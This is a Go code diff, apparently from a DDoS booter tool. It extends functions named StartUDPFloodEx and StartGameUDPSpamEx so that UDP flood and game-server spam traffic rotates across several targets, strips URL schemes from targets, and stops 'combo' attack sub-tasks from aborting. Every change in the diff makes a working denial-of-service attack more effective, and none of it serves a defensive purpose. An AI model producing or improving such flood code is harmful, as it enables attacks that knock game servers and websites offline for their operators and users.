@@ -954,6 +954,16 @@ func resolveTargets(cfg AttackConfig) []*net.UDPAddr {
 		if port == 0 {
 			port = 27015
 		}
+		// scheme 容错：combo 主目标带 http:// 前缀（如 https://example.com）时，
+		// UDP 子攻击继承该串会导致解析失败 abort——提取 host:port 部分
+		if strings.Contains(ip, "://") {
+			if u, err := url.Parse(t); err == nil && u.Host != "" {
+				ip, port = SplitTarget(u.Host)
+				if port == 0 {
+					port = 27015
+				}
+			}
+		}
 		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
 		if err != nil {
 			continue
@@ -1041,13 +1051,14 @@ func StartUDPFloodEx(cfg AttackConfig) *AttackSession {
 			wg.Add(1)
 			go func(td threadData, seed int) {
 				defer wg.Done()
-				addr := addrs[seed%len(addrs)]
-				conn, err := net.DialUDP("udp", nil, addr)
-				if err != nil {
-					atomic.AddUint64(&s.Stats.Errors, 1)
-					return
-				}
-				defer conn.Close()
+				var conn *net.UDPConn
+				defer func() {
+					if conn != nil {
+						conn.Close()
+					}
+				}()
+				var currentAddr *net.UDPAddr
+				addrIdx := uint64(seed)
 
 				endTime := time.Now().Add(dur)
 				tc := newTimeCache()
@@ -1060,6 +1071,26 @@ func StartUDPFloodEx(cfg AttackConfig) *AttackSession {
 					case <-s.StopChan:
 						return
 					default:
+					}
+
+					// 多目标轮换：每批切到下一个目标（connected socket 按需重建，
+					// fd 数恒定 = threads；此前每线程固定一个目标，多目标时
+					// 各目标只被部分线程打，分配不均）
+					addr := addrs[int(addrIdx%uint64(len(addrs)))]
+					addrIdx++
+					if conn == nil || currentAddr != addr {
+						if conn != nil {
+							conn.Close()
+						}
+						var err error
+						conn, err = net.DialUDP("udp", nil, addr)
+						if err != nil {
+							conn = nil
+							atomic.AddUint64(&s.Stats.Errors, 1)
+							time.Sleep(50 * time.Millisecond)
+							continue
+						}
+						currentAddr = addr
 					}
 
 					n := 0
@@ -1910,13 +1941,33 @@ func StartGameUDPSpamEx(cfg AttackConfig) *AttackSession {
 		return StartARKQueryAttackEx(cfg)
 	}
 	s := NewAttackSession(cfg.Target, cfg.Targets, "game_udp", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
-	ip, port := SplitTarget(cfg.Target)
-	if port == 0 {
-		port = 27015
+
+	// 多目标支持：换行拆分（combo 子攻击继承主任务换行目标串）。
+	// 此前用 SplitTarget 解析单串，多目标串会让 ResolveUDPAddr 失败 → abort。
+	targets := resolveTargetStrings(cfg)
+	addrs := make([]*net.UDPAddr, 0, len(targets))
+	for _, t := range targets {
+		ip, port := SplitTarget(t)
+		if port == 0 {
+			port = 27015
+		}
+		if ip == "" {
+			continue // 空 target 时 ":27015" 会被解析为 0.0.0.0（本机），必须拦截
+		}
+		// scheme 容错：combo 主目标带 http:// 前缀时提取 host:port
+		if strings.Contains(ip, "://") {
+			if u, err := url.Parse(t); err == nil && u.Host != "" {
+				ip, port = SplitTarget(u.Host)
+				if port == 0 {
+					port = 27015
+				}
+			}
+		}
+		if a, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port)); err == nil {
+			addrs = append(addrs, a)
+		}
 	}
-	// 空 target 时 SplitTarget 返回 ip=""，而 ":27015" 会被 ResolveUDPAddr
-	// 解析为 0.0.0.0:27015（本机），必须显式拦截
-	if ip == "" {
+	if len(addrs) == 0 {
 		s.abort()
 		return s
 	}
@@ -1924,12 +1975,6 @@ func StartGameUDPSpamEx(cfg AttackConfig) *AttackSession {
 	prefix := cfg.CustomPrefix
 	if len(prefix) == 0 {
 		prefix = gamePrefix(cfg.Game)
-	}
-
-	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
-	if err != nil {
-		s.abort()
-		return s
 	}
 
 	// PacketSize 必须大于 prefix 长度，否则 rng.Read(buf[len(prefix):]) 越界 panic
@@ -1951,12 +1996,14 @@ func StartGameUDPSpamEx(cfg AttackConfig) *AttackSession {
 			wg.Add(1)
 			go func(seed int64) {
 				defer wg.Done()
-				conn, err := net.DialUDP("udp", nil, addr)
-				if err != nil {
-					atomic.AddUint64(&s.Stats.Errors, 1)
-					return
-				}
-				defer conn.Close()
+				var conn *net.UDPConn
+				defer func() {
+					if conn != nil {
+						conn.Close()
+					}
+				}()
+				var currentAddr *net.UDPAddr
+				addrIdx := uint64(seed)
 
 				rng := NewFastRNG(time.Now().UnixNano() + seed)
 				endTime := time.Now().Add(dur)
@@ -1970,6 +2017,24 @@ func StartGameUDPSpamEx(cfg AttackConfig) *AttackSession {
 					case <-s.StopChan:
 						return
 					default:
+					}
+
+					// 多目标轮换（connected socket 按需重建）
+					addr := addrs[int(addrIdx%uint64(len(addrs)))]
+					addrIdx++
+					if conn == nil || currentAddr != addr {
+						if conn != nil {
+							conn.Close()
+						}
+						var err error
+						conn, err = net.DialUDP("udp", nil, addr)
+						if err != nil {
+							conn = nil
+							atomic.AddUint64(&s.Stats.Errors, 1)
+							time.Sleep(50 * time.Millisecond)
+							continue
+						}
+						currentAddr = addr
 					}
 
 					if !s.checkRate(cfg.PacketSize) {
